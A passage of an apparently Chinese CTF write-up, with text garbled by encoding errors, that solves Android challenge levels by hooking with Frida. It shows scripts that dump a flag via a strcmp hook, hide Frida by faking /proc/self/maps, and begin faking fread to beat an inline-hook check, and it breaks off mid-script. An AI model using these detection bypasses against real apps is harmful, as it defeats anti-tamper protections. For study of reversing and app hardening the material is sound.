class="hljs-function"><span class="hljs-title">x69A2</span>-&gt;</span><span class="hljs-number">27042</span><br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x8A5D</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5D8A</span>-&gt;</span><span class="hljs-number">23946</span><br></code></pre></td></tr></table></figure><p><code>23946</code> ç«¯å£æ˜¯ IDA android_server çš„é»˜è®¤ç«¯å£ï¼Œ<code>27042</code> æ˜¯ Frida é»˜è®¤ç«¯å£</p><p><img src="https://img.dkdun.cn/v1/2025/12/8da71fcd02c31a16.png"></p><p>å› æ­¤æˆ‘ä»¬è§£å†³åŠæ³•å°±æ˜¯å¼€å¯ frida æ—¶æŠŠç«¯å£æ”¹äº†ï¼Œä¸ç„¶ä¼šè¢«æ£€æµ‹åˆ°</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">./frida-server -l <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">9997</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d0d1117d0513d160.png"></p><p>ç„¶åæˆ‘æ‰“å¼€ç¨‹åºçš„æ—¶å€™è€æ˜¯è·³å‡ºè¿™ä¸ªå¼¹çª—ï¼Œçƒ¦æ­»äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/92a8ced625aec488.png"></p><p>å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥å…³æ‰ï¼ˆèœé¸¡ï¼Œè¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆå…¶ä»–æ–¹æ³•ï¼‰</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">adb shell am clear-debug-app<br></code></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªè„šæœ¬ hook.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> targetAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">var</span> input = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>)) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG: &quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error: &quot;</span> + e);<br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hook</span>();<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span> = <span class="hljs-title class_">MainActivity</span>.$new();<br>        <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å…ˆæŠŠç«¯å£è½¬å‘ä¸€ä¸‹ï¼ŒæŠŠæ¨¡æ‹Ÿå™¨çš„ <code>9997</code> ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„ <code>9997</code>ï¼Œå› ä¸ºé€šè¿‡ <code>adb forward</code> æŠŠå®ƒçš„ç«¯å£æ˜ å°„åˆ°äº†æœ¬åœ°ï¼Œhook æ—¶éœ€è¦å†™ä¸€ä¸ª  <code>127.0.0.1:9997</code> ï¼ˆå…¶å®è¿˜å¯ä»¥ç”¨æœ¬æœºçš„ IPï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯èƒ½ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œæ¨¡æ‹Ÿå™¨æœ‰æ—¶å€™æ— æ³•ç›´æ¥é€šè¿‡ IP è®¿é—®è®¾å¤‡ä¸Šçš„ä¸€äº›æœåŠ¡ï¼‰è¿æ¥åˆ°è¿™ä¸ªç«¯å£</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">./frida-server <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9997</span><br>adb forward tcp:<span class="hljs-number">9997</span> tcp:<span class="hljs-number">9997</span><br>frida -H <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9997</span> -f com.swdd.summertrain -l hook.js<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/342d0198eba009a7.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;<span class="hljs-number">53</span>cd3f37664bd01357182ca13bc2f9b6&#125;<br></code></pre></td></tr></table></figure><h1 id="Fridaæ£€æµ‹ä¹‹Maps-level9"><a href="#Fridaæ£€æµ‹ä¹‹Maps-level9" class="headerlink" title="Fridaæ£€æµ‹ä¹‹Maps-level9"></a>Fridaæ£€æµ‹ä¹‹Maps-level9</h1><p>Java å±‚æ²¡ä»€ä¹ˆä¸œè¥¿ï¼ŒåŒæ ·æ˜¯çœ‹ <code>Native</code> å±‚ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ£€æµ‹ <code>maps</code> çš„ã€‚</p><p><code>/proc/self/maps</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„ä¿¡æ¯ã€‚å½“ä½ æ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†è¿›ç¨‹ä¸­æ¯ä¸ªå†…å­˜åŒºåŸŸçš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯é€šå¸¸åŒ…æ‹¬ï¼š</p><ul><li>èµ·å§‹åœ°å€ï¼ˆStart Addressï¼‰</li><li>ç»“æŸåœ°å€ï¼ˆEnd Addressï¼‰</li><li>æƒé™ï¼ˆå¦‚å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œï¼‰</li><li>å…±äº«&#x2F;ç§æœ‰æ ‡å¿—ï¼ˆShared or Privateï¼‰</li><li>å…³è”çš„æ–‡ä»¶æˆ–è®¾å¤‡ï¼ˆå¦‚æœå†…å­˜åŒºåŸŸæ˜¯æ–‡ä»¶æ˜ å°„çš„ï¼‰</li><li>å†…å­˜åŒºåŸŸçš„åç§»é‡</li><li>å†…å­˜åŒºåŸŸçš„ç±»å‹ï¼ˆå¦‚åŒ¿åæ˜ å°„ã€æ–‡ä»¶æ˜ å°„ã€è®¾å¤‡æ˜ å°„ç­‰ï¼‰</li></ul><p>å½“æ³¨å…¥fridaåï¼Œåœ¨mapsæ–‡ä»¶ä¸­å°±ä¼šå­˜åœ¨ <code>frida-agent-64.so</code>ã€<code>frida-agent-32.so</code> ç­‰æ–‡ä»¶ã€‚</p><p>ï¼ˆä¸Šé¢è¿™æ®µä¸“ä¸šæœ¯è¯­ copy çš„ 52 çš„æ­£å·±å¸ˆå‚…çš„hhhhhï¼‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/e46f7cc7608020b7.png"></p><p>è¿™ä¸ªå‡½æ•°æµç¨‹å°±æ˜¯æ‰“å¼€ <code>proc/self/maps</code> ï¼Œç„¶åæ£€æµ‹æ˜¯å¦æœ‰è¿™äº›å†…å­˜ç‰¹å¾ï¼Œå¦‚æœæœ‰å°±ç›´æ¥ç»ˆæ­¢ç¨‹åº</p><ul><li><code>frida</code>ï¼šæ£€æµ‹ Frida æ³¨å…¥çš„ Agent æˆ– Server</li><li><code>gadget</code>&#x2F;<code>agent</code>ï¼šæ£€æµ‹ Frida Gadget æˆ–è°ƒè¯•å·¥å…·ç»„ä»¶</li><li><code>/data/local/tmp/</code>ï¼šæ£€æµ‹ä¸´æ—¶ç›®å½•ä¸‹çš„æ³¨å…¥æ–‡ä»¶ï¼ˆå¦‚ Frida Serverï¼‰</li><li><code>-64.so</code>&#x2F;<code>-32.so</code>ï¼šæ£€æµ‹ç‰¹å®šæ¶æ„çš„åŠ¨æ€åº“ï¼ˆå¦‚ Frida çš„ 64&#x2F;32 ä½åº“ï¼‰</li></ul><p>hook è„šæœ¬ï¼Œé‡å®šå‘ä¸€ä¸ª <code>maps</code> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºé‡å®šå‘å¹¶ä¿®æ”¹mapsæ–‡ä»¶å†…å®¹ï¼Œä»¥éšè—ç‰¹å®šçš„åº“å’Œè·¯å¾„ä¿¡æ¯</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mapsRedirect</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// å®šä¹‰ä¼ªé€ çš„mapsæ–‡ä»¶è·¯å¾„</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FakeMaps</span> = <span class="hljs-string">&quot;/data/data/com.swdd.summertrain/maps&quot;</span>;<br>    <span class="hljs-comment">// è·å–libc.soåº“ä¸­&#x27;open&#x27;å‡½æ•°çš„åœ°å€</span><br>    <span class="hljs-keyword">const</span> openPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>);<br>    <span class="hljs-comment">// æ ¹æ®åœ°å€åˆ›å»ºä¸€ä¸ªæ–°çš„NativeFunctionå¯¹è±¡ï¼Œè¡¨ç¤ºåŸç”Ÿçš„&#x27;open&#x27;å‡½æ•°</span><br>    <span class="hljs-keyword">const</span> open = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-comment">// æŸ¥æ‰¾å¹¶è·å–libc.soåº“ä¸­&#x27;read&#x27;å‡½æ•°çš„åœ°å€</span><br>    <span class="hljs-keyword">var</span> readPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// åˆ›å»ºæ–°çš„NativeFunctionå¯¹è±¡è¡¨ç¤ºåŸç”Ÿçš„&#x27;read&#x27;å‡½æ•°</span><br>    <span class="hljs-keyword">var</span> read = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(readPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&quot;int&quot;</span>]);<br>    <span class="hljs-comment">// åˆ†é…512å­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œç”¨äºä¸´æ—¶å­˜å‚¨ä»mapsæ–‡ä»¶è¯»å–çš„å†…å®¹</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsBuffer</span> = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">512</span>);<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªä¼ªé€ çš„mapsæ–‡ä»¶ï¼Œç”¨äºå†™å…¥ä¿®æ”¹åçš„å†…å®¹ï¼Œæ¨¡å¼ä¸º&quot;w&quot;ï¼ˆå†™å…¥ï¼‰</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-title class_">FakeMaps</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-comment">// ä½¿ç”¨Interceptoræ›¿æ¢åŸæœ‰çš„&#x27;open&#x27;å‡½æ•°ï¼Œæ³¨å…¥è‡ªå®šä¹‰é€»è¾‘</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(openPtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">pathname, flag</span>) &#123;<br>        <span class="hljs-comment">// è°ƒç”¨åŸå§‹çš„&#x27;open&#x27;å‡½æ•°ï¼Œå¹¶è·å–æ–‡ä»¶æè¿°ç¬¦ï¼ˆFDï¼‰</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FD</span> = <span class="hljs-title function_">open</span>(pathname, flag);<br>        <span class="hljs-comment">// è¯»å–å¹¶æ‰“å°å°è¯•æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„</span><br>        <span class="hljs-keyword">var</span> ch = pathname.<span class="hljs-title function_">readCString</span>();<br>        <span class="hljs-keyword">if</span> (ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/proc/&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;maps&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open : &quot;</span>, pathname.<span class="hljs-title function_">readCString</span>());<br>            <span class="hljs-comment">// å¾ªç¯è¯»å–mapså†…å®¹ï¼Œå¹¶å†™å…¥ä¼ªé€ çš„mapsæ–‡ä»¶ä¸­ï¼ŒåŒæ—¶è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢ä»¥éšè—ç‰¹å®šä¿¡æ¯</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">read</span>(<span class="hljs-variable constant_">FD</span>, <span class="hljs-title class_">MapsBuffer</span>, <span class="hljs-number">512</span>)) !== <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">var</span> <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MapsBuffer</span>.<span class="hljs-title function_">readCString</span>();<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp/re.frida.server/frida-agent-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;re.frida.server&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;agent&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-32.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;gadget&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp&quot;</span>, <span class="hljs-string">&quot;/1&quot;</span>);<br>                <span class="hljs-comment">// å°†ä¿®æ”¹åçš„å†…å®¹å†™å…¥ä¼ªé€ çš„mapsæ–‡ä»¶</span><br>                <span class="hljs-title class_">MapsFile</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">MBuffer</span>);<br>            &#125;<br>            <span class="hljs-comment">// ä¸ºè¿”å›ä¼ªé€ mapsæ–‡ä»¶çš„æ‰“å¼€æ“ä½œï¼Œåˆ†é…UTF8ç¼–ç çš„æ–‡ä»¶åå­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">var</span> filename = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-title class_">FakeMaps</span>);<br>            <span class="hljs-comment">// è¿”å›æ‰“å¼€ä¼ªé€ mapsæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">open</span>(filename, flag);<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœä¸æ˜¯ç›®æ ‡mapsæ–‡ä»¶ï¼Œåˆ™ç›´æ¥è¿”å›åŸopenè°ƒç”¨çš„ç»“æœ</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">FD</span>;<br>    &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mapsRedirect</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—å‡º flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/5fe15c2bd9761773.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;f5d02d7eede3a75ee6e6cc0a9673c76f&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-æ£€æµ‹ä¹‹-inlineHook-level10"><a href="#Frida-æ£€æµ‹ä¹‹-inlineHook-level10" class="headerlink" title="Frida æ£€æµ‹ä¹‹ inlineHook-level10"></a><strong>Frida æ£€æµ‹ä¹‹ inlineHook</strong>-level10</h1><p>çœ‹ <code>native</code>  å±‚çš„ <code>check</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/49f0f9abdb1a4e9a.png"></p><p>è¯»å–ç£ç›˜ä¸­ <code>libc.so</code> æ–‡ä»¶ <code>signal</code> å‡½æ•°çš„åŸå§‹ 8 å­—èŠ‚æ•°ï¼Œè·å–å†…å­˜ä¸­ <code>signal</code> å‡½æ•°çš„å®é™…ä»£ç æ¯”è¾ƒäºŒè€…æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´ç¨‹åºå°±ä¼šé€€å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ¨¡æ‹Ÿ <code>fread</code> è¯»å–äº†é¢„æœŸæ•°æ®ï¼Œä¼ªé€ è¿”å›å€¼</p><p>è·å– hook å‰é¢çš„ 8 ä¸ªå­—èŠ‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bytes_count = <span class="hljs-number">8</span><br><span class="hljs-keyword">let</span> address = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;signal&quot;</span>)<br><span class="hljs-comment">//è¯»å– signal å‡½æ•°</span><br><br><span class="hljs-keyword">let</span> before = <span class="hljs-title function_">ptr</span>(address)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot; before hook: &quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(before, &#123;<br>    <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">length</span>: bytes_count,<br>    <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>  &#125;));<br><br></code></pre></td></tr></table></figure><p>å¾—å‡º</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">e9 <span class="hljs-number">7</span>f f7 <span class="hljs-number">97</span> f4 <span class="hljs-number">83</span> e4 f0<br></code></pre></td></tr></table></figure><p>hook è„šæœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_memcmp_addr</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//hookåè°ƒè¯•</span><br>    <span class="hljs-keyword">var</span> memcmp_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fread&quot;</span>);<br>    <span class="hljs-keyword">if</span> (memcmp_addr !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;fread address: &quot;</span>, memcmp_addr);<br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(memcmp_addr, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = args[<span class="hljs-number">0</span>];   <span class="hljs-comment">// ä¿å­˜ buffer å‚æ•°</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = args[<span class="hljs-number">1</span>];     <span class="hljs-comment">// ä¿å­˜ size å‚æ•°</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = args[<span class="hljs-number">2</span>];    <span class="hljs-comment">// ä¿å­˜ count å‚æ•°</span><br>            <span class="hljs-variable 